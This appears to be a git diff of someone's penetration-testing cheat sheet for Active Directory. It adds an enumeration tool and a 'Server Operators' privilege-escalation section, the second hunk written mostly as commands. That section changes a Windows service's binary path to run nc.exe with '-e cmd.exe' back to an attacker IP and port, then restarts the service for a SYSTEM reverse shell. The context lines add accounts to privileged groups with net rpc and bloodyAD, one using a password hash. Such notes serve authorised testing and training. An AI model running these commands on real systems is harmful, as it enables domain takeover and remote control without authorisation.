@@ -56,6 +56,7 @@ search for:
 - list Certificates
 - list ACL permissions
 - collect Bloodhound files
+- enum4linux
 
 
 try using default credentials like `guest` and no password\
@@ -241,7 +242,22 @@ with Generic All permissions you can change your group membership.
 - `net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
 - `bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add groupMember 'Administrators' test`
 
-# 
+# Server Operators Group
+explotaible. [Learn more.](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators)
+
+Members of this group can start/stop system services. Let's
+modify a service binary path to obtain a reverse shell.
+```ps1
+upload nc.exe
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe {IP} {PORT}"
+```
+Stand up a listener issue the below commands to obtain the reverse shell.
+
+```ps1
+sc.exe stop vss
+sc.exe start vss
+```
+You can obtain a reverse shell with `NT Authority`
 
 # notes from adri TODO
 
